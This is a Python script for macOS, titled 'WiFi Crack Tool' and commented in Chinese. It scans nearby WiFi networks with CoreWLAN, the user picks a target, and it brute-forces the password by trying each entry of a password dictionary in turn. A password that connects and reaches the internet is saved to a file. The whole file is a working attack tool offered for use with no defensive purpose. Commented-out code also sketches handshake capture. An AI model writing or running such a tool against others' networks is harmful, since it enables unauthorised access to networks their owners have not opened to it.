import CoreWLAN, CoreLocation, re, os, sys, json, socket, Foundation
from prettytable import PrettyTable
from time import sleep
import pyfiglet
from Cocoa import NSApplication

def colourise_rssi(rssi):
    if rssi > -60:
        # Green for strong signal
        return f"\033[92m{rssi}\033[0m"
    elif rssi > -80:
        # Yellow for moderate signal
        return f"\033[93m{rssi}\033[0m"
    else:
        # Red for weak signal
        return f"\033[91m{rssi}\033[0m"

def scan_wifi_networks(cwlan_interface=None):
    """
    使用 CoreWLAN 库扫描 WiFi 网络
    
    返回:
    list: WiFi 网络名称的列表
    """
    print('\n正在扫描网络...\n')

    # 扫描网络
    scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(None, None)

    # 解析扫描结果并在表格中展示
    table = PrettyTable(['序号', '名称', 'BSSID', 'RSSI', '信道', '安全性'])
    networks = []

    # 检查扫描结果是否为空
    if scan_results is not None:
        # 遍历扫描结果
        for i, result in enumerate(scan_results):
            # 存储网络的相关信息
            network_info = {
                'ssid': result.ssid(),  # 网络的SSID
                'bssid': result.bssid(),  # 网络的BSSID
                'rssi': result.rssiValue(),  # 网络的RSSI值（信号强度）
                'channel_object': result.wlanChannel(),  # 无线频道对象
                'channel_number': result.channel(),  # 无线频道号
                'security': re.search(r'security=(.*?)(,|$)', str(result)).group(1)  # 网络的安全协议
            }
            # 将网络信息添加到网络列表中
            networks.append(network_info)

        # 根据RSSI值对网络进行降序排序
        networks_sorted = sorted(networks, key=lambda x: x['rssi'], reverse=True)

        # 将排序后的网络信息添加到表格中
        for i, network in enumerate(networks_sorted):
            # 根据RSSI值为网络信号强度上色
            coloured_rssi = colourise_rssi(network['rssi'])
            # 向表格中添加一行数据
            table.add_row([i + 1, network['ssid'], network['bssid'], coloured_rssi, network['channel_number'], network['security']])

    print(table)
    return networks_sorted

# def attempt_wifi_connection(ssid, password):
#     try:
#         # macOS 系统的网络设置命令
#         result = subprocess.run([
#             '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport',
#             '-A', ssid,
#             'password', password
#         ], capture_output=True, text=True, timeout=10)
#
#         # 检查是否成功连接
#         return 'successfully' in result.stdout.lower()
#     except Exception as e:
#         print(f"连接 WiFi 时出错: {e}")
#         return False

# def crack_wifi(ssid, password_file):
#     """
#     使用暴力破解尝试破解 WiFi 密码
#
#     参数:
#     ssid (str): WiFi 网络名称
#     password_file (str): 密码字典文件路径
#
#     返回:
#     str 或 None: 如果找到密码返回密码，未找到则返回 None
#     """
#     # 与当前网络断开连接
#     cwlan_interface.disassociate()
#     try:
#         with open(password_file, 'r', encoding='utf-8') as file:
#             for line in file:  # 遍历密码字典
#                 password = line.strip()  # 去除换行符
#                 if attempt_wifi_connection(ssid, password):  # 尝试连接
#                     return password  # 如果连接成功，返回密码
#         return None  # 如果字典中的所有密码都无效，返回 None
#     except Exception as e:
#         print(f"破解 WiFi 时出错: {e}")
#         return None

# def crack_wifi(bssid, channel, cwlan_interface=None):
#     # 与当前网络断开连接
#     cwlan_interface.disassociate()
#
#     # 设置无线电频道
#     cwlan_interface.setWLANChannel_error_(channel, None)
#
#     # 确定网络接口
#     iface = cwlan_interface.interfaceName()
#
#     # 开始破解捕获的握手
#     # crack_capture()

# print("✅成功连接到网络: {network.ssid()}")
#             sleep(3)  # 给系统一些时间建立连接

def connect_to_wifi(cwlan_interface, network, password):
    """
    尝试使用给定的密码连接到WiFi网络。
    
    参数:
        cwlan_interface: CoreWLAN 接口对象
        network (dict): 网络扫描结果中的网络信息
        password (str): 用于连接的密码
    
    返回:
        bool: 如果连接成功，返回True，否则返回False
    """
    try:
        # 将网络名称（SSID）转换为 NSString
        network_name = Foundation.NSString.stringWithString_(network['ssid'])
        
        # 尝试连接到网络
        success, error = cwlan_interface.associateToNetwork_password_error_(
            network_name, 
            password, 
            None
        )
        
        if success:
            print(f"\n✅ 成功连接到网络: {network['ssid']}")
            return True
        else:
            if error:
                print(f"\n❌ 连接失败: {error}")
            return False
    
    except Exception as e:
        print(f"\n❌ 连接时发生异常: {e}")
        return False

def verify_internet_connection(timeout=10):
    """
    验证是否有活动的互联网连接。
    
    参数:
        timeout (int): 连接检查的超时时间，单位为秒
    
    返回:
        bool: 如果有互联网连接，返回True，否则返回False
    """
    try:
        # 尝试创建一个与可靠服务器的socket连接
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("223.5.5.5", 53))
        return True
    except (socket.error, socket.timeout):
        return False

def wifi_connect_with_password_dict(cwlan_interface, network, pwd_dict_data):
    """
    尝试通过密码字典中的密码连接到WiFi网络。
    
    参数:
        cwlan_interface: CoreWLAN 接口对象
        network (dict): 网络扫描结果中的网络信息
        pwd_dict_data (list): 要尝试的密码列表
    
    返回:
        str or None: 成功连接的密码，如果连接失败返回None
    """
    # 断开当前网络连接
    cwlan_interface.disassociate()
    print(f"\n🔍 正在尝试破解网络: {network['ssid']}")
    
    # 跟踪已尝试的密码，以避免重复尝试
    tried_passwords = set()
    
    for password in pwd_dict_data:
        # 如果密码已经尝试过，跳过该密码
        if password in tried_passwords:
            continue
        
        tried_passwords.add(password)
        
        print(f"尝试密码: {password}")
        
        # 尝试连接
        if connect_to_wifi(cwlan_interface, network, password):
            # 验证是否有互联网连接
            if verify_internet_connection():
                print(f"\n🌐 成功连接并验证互联网连接！")
                print(f"网络: {network['ssid']}")
                print(f"密码: {password}")
                return password
            else:
                print("❌ 连接成功但无法访问互联网，继续尝试...")
    
    print("\n❌ 无法使用给定的密码字典连接网络")
    return None


def load_or_create_config(config_file_path=None, config_settings_data=None):
    """加载现有配置或创建默认配置"""
    if os.path.exists(config_file_path):  # 如果配置文件存在
        with open(config_file_path, 'r', encoding='utf-8') as config_file:
            config_settings_data = json.load(config_file)  # 读取配置文件
    else:  # 如果配置文件不存在，创建默认配置文件
        with open(config_file_path, 'w', encoding='utf-8') as config_file:
            json.dump(config_settings_data, config_file, indent=4)  # 写入默认配置

def load_pwd_dict(pwd_dict_path=None, pwd_dict_data=None):
    """加载密码字典"""
    if os.path.exists(pwd_dict_path):  # 如果密码字典文件存在
        with open(pwd_dict_path, 'r', encoding='utf-8') as file:
            for line in file:
                password = line.strip()  # 去除行尾的换行符和多余空白字符
                if password:  # 如果该行有有效密码（避免空行）
                    pwd_dict_data.append(password)  # 添加密码到列表

def main():
    # 使用pyfiglet库打印大字标题
    f = pyfiglet.Figlet(font='big') # 设置字体为'big'，用于显示标题
    print('\n' + f.renderText('WiFi Crack Tool'))

    # 初始化 macOS 应用
    app = NSApplication.sharedApplication()

    # 初始化CoreLocation来访问macOS的定位服务
    location_manager = CoreLocation.CLLocationManager.alloc().init()  # 创建一个CoreLocation实例来管理定位服务

    # 检查定位服务是否启用
    if not location_manager.locationServicesEnabled():
        exit('定位服务未启用，请启用定位服务并重试...')  # 如果定位服务未启用，退出程序并提示用户启用定位服务

    # 请求定位服务授权
    print('尝试获取定位服务授权（WiFi扫描必要）...')
    location_manager.requestWhenInUseAuthorization()  # 请求应用程序在使用时访问位置的权限

    # 配置文件、日志文件和字典文件的目录
    config_dir_path = os.path.join(os.getcwd(), "config")  # 配置目录路径
    log_dir_path = os.path.join(os.getcwd(), "log")  # 日志目录路径

    # 如果这些目录不存在，则创建它们
    for path in [config_dir_path, log_dir_path]:
        os.makedirs(path, exist_ok=True)

    # 配置文件的路径
    config_file_path = os.path.join(config_dir_path, 'settings.json')
    
    # 默认配置
    config_settings_data = {
        'scan_time': 8,  # 扫描网络的时间（秒）
        'connect_time': 3,  # 尝试连接的时间（秒）
        'pwd_txt_path': 'passwords.txt'  # 默认的密码字典路径
    }

    # 加载或创建配置
    load_or_create_config(config_file_path, config_settings_data)

    # 密码字典文件路径
    pwd_dict_path = os.path.join(config_settings_data['pwd_txt_path'])
    pwd_dict_data = []  # 用于存储字典数据
    print('开始加载密码字典...')
    load_pwd_dict(pwd_dict_path, pwd_dict_data)  # 加载密码字典
    print('密码字典加载完成!')

    # 等待定位服务授权
    max_wait = 30  # 最大等待时间为30秒
    for i in range(max_wait):
        # 获取当前定位授权状态
        authorization_status = location_manager.authorizationStatus()
        # 授权状态说明：
        # 0 = 未确定 1 = 限制 2 = 拒绝 3 = 永久授权 4 = 使用时授权
        if authorization_status in [3, 4]:  # 如果授权状态是永久授权或使用时授权
            print('已获得授权，继续...')
            break  # 授权通过，退出循环继续执行
        if i >= max_wait - 1:  # 如果超过最大等待时间
            exit('未能获得授权，程序退出...')  # 退出程序并提示无法获得授权
        sleep(1)  # 每秒检查一次授权状态

    # 获取默认 WiFi 接口
    cwlan_client = CoreWLAN.CWWiFiClient.sharedWiFiClient()
    cwlan_interface = cwlan_client.interface()

    # 扫描可用的 WiFi 网络
    networks_sorted = scan_wifi_networks(cwlan_interface)

    # 要求用户选择要破解的网络
    x = int(input('\n选择要破解的网络(输入序号): ')) - 1

    selected_network = networks_sorted[x]
    
    # 添加密码破解功能
    connected_password = wifi_connect_with_password_dict(
        cwlan_interface, 
        selected_network, 
        pwd_dict_data
    )
    
    if connected_password:
        # 可选：将成功的密码保存到文件
        with open(os.path.join(config_dir_path, 'successful_connections.txt'), 'a') as f:
            f.write(f"Network: {selected_network['ssid']}, Password: {connected_password}\n")
    else:
        print("未能成功连接到网络")




    # crack_wifi(networks_sorted[x]['bssid'], networks_sorted[x]['channel_object'], cwlan_interface)
    





if __name__ == "__main__":
    main()







# 备用/废弃代码
# import subprocess
# x = int(subprocess.run(['osascript', '-e', 'display dialog "请输入要破解的网络(序号):" with hidden answer default answer "" with title "输入对话框" buttons {"取消", "确定"} default button "确定" giving up after 60', '-e', 'text returned of result'], capture_output=True, text=True).stdout) - 1
# dict_dir_path = os.path.join(os.getcwd(), "dict")  # 字典目录路径

# iface = cwlan_interface.interfaceName() 接口名
# timeout 2 networksetup -setairportnetwork en0 ssid password


